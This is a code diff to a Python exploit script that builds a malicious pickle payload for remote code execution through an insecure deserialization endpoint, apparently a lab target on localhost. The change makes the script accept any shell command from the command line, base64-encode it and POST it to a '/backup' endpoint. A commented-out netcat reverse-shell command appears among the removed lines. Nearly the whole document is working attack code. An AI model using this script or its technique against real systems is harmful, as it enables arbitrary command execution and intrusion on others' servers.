@@ -2,6 +2,7 @@ import pickle
 import base64
 import subprocess
 import requests
+import sys
 
 class RCE:
     def __init__(self, command):
@@ -12,15 +13,17 @@ class RCE:
 
 
 if __name__ == '__main__':
-
-    #pickled = pickle.dumps(RCE('nc -e /bin/sh 127.0.0.1 1234'))
-    pickled = pickle.dumps(RCE('whoami'))
-    payload = base64.b64encode(pickled)
+    args = sys.argv[1:]
+    if len(args) < 1:
+        print("[!] Usage: python serialize.py <cmd>")
+        sys.exit()
+    command = " ".join(args)
+    payload = base64.b64encode(pickle.dumps(RCE(command)))
 
     print("[+] Sending exploit")
 
-    r = requests.get("http://localhost:5000/backup", params={"info": payload})
+    r = requests.post("http://localhost:5000/backup", data={"search": payload})
     if "No backup files found for" in r.text:
-        print("[!] Exploit didn't work")
+        print("[!] Exploit didn't work, try another command")
     else:
         print(f"[+] result: {r.text}")
